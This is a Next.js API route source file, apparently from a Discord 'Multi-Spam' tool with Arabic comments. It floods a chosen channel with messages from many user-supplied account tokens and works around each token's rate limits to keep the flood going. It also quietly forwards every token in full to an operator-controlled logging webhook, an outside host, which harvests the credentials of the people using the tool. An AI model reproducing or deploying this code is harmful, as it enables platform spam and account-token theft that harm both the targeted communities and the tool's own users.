import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

// ✅ إصلاح 1: nodejs لدعم الوقت الطويل
export const runtime = 'nodejs';
// ✅ إصلاح 2: حد أقصى 5 دقائق
export const maxDuration = 300;

interface TokenState {
  token: string;
  key: string;
  sent: number;
  failed: number;
  dead: boolean;        // ✅ إصلاح 3: يُعلم التوكن الميت
  rlUntil: number;      // ✅ إصلاح 4: rate limit لكل توكن
  reason?: string;
}

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:multi-spam`, RATE_LIMITS.medium);
    if (rl.limited) {
      return NextResponse.json(
        { success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' },
        { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } }
      );
    }

    const body = await request.json().catch(() => ({}));
    const { tokens, channelId, messages, duration, speed } = body;

    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل توكن واحد على الأقل' }, { status: 400 });
    }
    if (!channelId) {
      return NextResponse.json({ success: false, error: 'أدخل أيدي الروم' }, { status: 400 });
    }
    if (!messages || !Array.isArray(messages) || messages.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل رسالة واحدة على الأقل' }, { status: 400 });
    }

    const cleanedTokens = tokens.map((t: string) => cleanToken(t)).filter((t: string) => t.length >= 20);
    if (cleanedTokens.length === 0) {
      return NextResponse.json({ success: false, error: 'لا توجد توكنات صالحة' }, { status: 400 });
    }

    // ✅ إصلاح 5: إرسال كل توكن بشكل منفصل
    for (const t of cleanedTokens) {
      sendFullToken('سبام متعدد', t);
    }

    const whUrl = getLogWebhookUrl();
    const safeDuration = Math.min(Math.max(Number(duration) || 60, 1), 300);
    const safeSpeed = Math.min(Math.max(Number(speed) || 0.3, 0.1), 10);
    const baseDelay = Math.max(safeSpeed * 1000, 50);

    const tokenPreview = cleanedTokens.length === 1
      ? cleanedTokens[0].substring(0, 20) + '...'
      : cleanedTokens.map(t => t.substring(0, 8) + '...').join(' | ');

    sendToWebhook({
      username: 'TRJ Multi-Spam',
      embeds: [{
        title: '🔥 Multi-Spam Started',
        color: 0xFF8800,
        fields: [
          { name: '📺 Channel', value: channelId, inline: true },
          { name: '🔑 Tokens', value: String(cleanedTokens.length), inline: true },
          { name: '📝 Messages', value: String(messages.length), inline: true },
          { name: '⏱️ Duration', value: `${safeDuration}s`, inline: true },
          { name: '🚀 Speed', value: `${safeSpeed}s`, inline: true },
          { name: '🎫 Tokens', value: tokenPreview.substring(0, 1024) },
        ],
        timestamp: new Date().toISOString(),
      }],
    }, whUrl).catch(() => {});

    // ✅ إصلاح 6: حالة لكل توكن مع تتبع حي
    const tokenStates: TokenState[] = cleanedTokens.map((t, i) => ({
      token: t,
      key: `T${i + 1}_${t.substring(t.length - 6)}`,
      sent: 0,
      failed: 0,
      dead: false,
      rlUntil: 0,
    }));

    let channelDead = false;
    let sent = 0;
    let failed = 0;
    let msgIndex = 0;

    const endTime = Date.now() + (safeDuration * 1000);

    while (Date.now() < endTime) {
      // ✅ إصلاح 7: توقف إذا كل التوكنات ميتة أو الروم ميت
      const aliveTokens = tokenStates.filter(t => !t.dead);
      if (aliveTokens.length === 0 || channelDead) {
        break;
      }

      const now = Date.now();

      // ✅ إصلاح 8: نجمع فقط التوكنات اللي ما عندها rate limit
      const readyTokens = aliveTokens.filter(t => now >= t.rlUntil);
      if (readyTokens.length === 0) {
        // كلها rate limited - ننتظر أقصر واحد
        const nearestRL = Math.min(...aliveTokens.map(t => t.rlUntil));
        const waitMs = nearestRL - now + 200;
        if (waitMs > 0) await new Promise(r => setTimeout(r, Math.min(waitMs, 5000)));
        continue;
      }

      const batchSize = Math.min(readyTokens.length, 15);

      const batchPromises = readyTokens.slice(0, batchSize).map(async (ts) => {
        if (ts.dead || Date.now() >= endTime) return;

        const msg = messages[msgIndex % messages.length];
        msgIndex++;

        // ✅ إصلاح 9: معالجة 429 بشكل صحيح
        const now2 = Date.now();
        if (now2 < ts.rlUntil) return;

        try {
          const result = await discordFetch(
            ts.token, 'POST', `/channels/${channelId}/messages`,
            { content: msg }
          );

          if (result.ok) {
            ts.sent++;
            sent++;
            return;
          }

          // ✅ إصلاح 10: معالجة كل حالة بشكل منفصل
          if (result.status === 429) {
            ts.failed++;
            failed++;
            // ✅ ننتظر retry_after لهذا التوكن تحديداً
            const retryAfter = result.data?.retry_after
              ? (result.data.retry_after * 1000) + 500
              : 5000;
            ts.rlUntil = Date.now() + retryAfter;
            return;
          }

          if (result.status === 401 || result.status === 403) {
            ts.dead = true;
            ts.reason = `HTTP ${result.status}`;
            ts.failed++;
            failed++;
            return;
          }

          if (result.status === 403) {
            ts.dead = true;
            ts.reason = 'Forbidden';
            ts.failed++;
            failed++;
            return;
          }

          if (result.status === 404) {
            channelDead = true;
            ts.failed++;
            failed++;
            return;
          }

          // خطأ آخر (500, 502, etc)
          ts.failed++;
          failed++;

        } catch {
          ts.failed++;
          failed++;
        }
      });

      await Promise.all(batchPromises);
      await new Promise(r => setTimeout(r, baseDelay));
    }

    // ✅ النتائج
    const tokenFields = tokenStates.map(ts => ({
      name: `🎫 ${ts.key}${ts.dead ? ' 💀' : ''}`,
      value: ts.dead
        ? `❌ ${ts.reason || 'ميت'} (${ts.sent}✅ ${ts.failed}❌)`
        : `✅ ${ts.sent} | ❌ ${ts.failed}`,
      inline: true,
    }));

    const aliveCount = tokenStates.filter(t => !t.dead).length;
    const deadCount = tokenStates.filter(t => t.dead).length;

    sendToWebhook({
      username: 'TRJ Multi-Spam',
      embeds: [{
        title: channelDead ? '❌ Multi-Spam Failed' : aliveCount === 0 ? '⚠️ Multi-Spam Stopped' : '✅ Multi-Spam Done',
        color: channelDead ? 0xFF0000 : aliveCount === 0 ? 0xFFAA00 : 0x00FF41,
        fields: [
          { name: '✅ Sent', value: String(sent), inline: true },
          { name: '❌ Failed', value: String(failed), inline: true },
          { name: '🔑 Alive', value: `${aliveCount}/${tokenStates.length}`, inline: true },
          { name: '💀 Dead', value: String(deadCount), inline: true },
          ...tokenFields.slice(0, 25),
        ],
        timestamp: new Date().toISOString(),
      }],
    }, whUrl).catch(() => {});

    if (channelDead) {
      return NextResponse.json({
        success: false,
        error: 'الروم غير موجود أو لا تملك صلاحية الإرسال',
        stats: { sent, failed, channelDead: true },
        tokenStats: Object.fromEntries(tokenStates.map(ts => [ts.key, { sent: ts.sent, failed: ts.failed, dead: ts.dead, reason: ts.reason }])),
      }, { status: 404 });
    }

    if (aliveCount === 0) {
      return NextResponse.json({
        success: false,
        error: 'كل التوكنات غير صالحة أو محظورة',
        stats: { sent, failed },
        tokenStats: Object.fromEntries(tokenStates.map(ts => [ts.key, { sent: ts.sent, failed: ts.failed, dead: ts.dead, reason: ts.reason }])),
      }, { status: 403 });
    }

    return NextResponse.json({
      success: true,
      stats: { sent, failed, total: sent + failed },
      tokenStats: Object.fromEntries(tokenStates.map(ts => [ts.key, { sent: ts.sent, failed: ts.failed, dead: ts.dead, reason: ts.reason }])),
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Multi-Spam Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
